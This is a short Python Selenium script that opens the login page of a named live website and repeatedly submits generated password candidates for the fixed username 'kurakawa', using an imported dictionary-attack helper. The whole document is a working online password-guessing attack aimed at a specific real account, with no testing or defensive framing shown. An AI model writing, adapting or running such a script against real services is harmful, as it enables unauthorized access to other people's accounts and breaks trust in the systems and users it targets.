from selenium import webdriver
from time import sleep
from attck import dictionaly_attack

driver = webdriver.Chrome()
driver.get("https://tbc.ttc-net.co.jp/web/login/ttc")
sleep(3)

dictionaly_file = "dict.txt"
string = 'abcdefghijklmnopqrstuvwxyz 0123456789'
ans = dictionaly_attack(string, dictionaly_file, 3)
for i in ans:
    driver.find_element_by_name('session[login_name]').send_keys("kurakawa")
    driver.find_element_by_name('session[password]').send_keys(i)
    driver.find_element_by_xpath('//*[@id="inspire"]/div[2]/main/div/div/div/div/div/div/form/div[4]/button').click()
    sleep(2)
driver.close()
driver.quit()
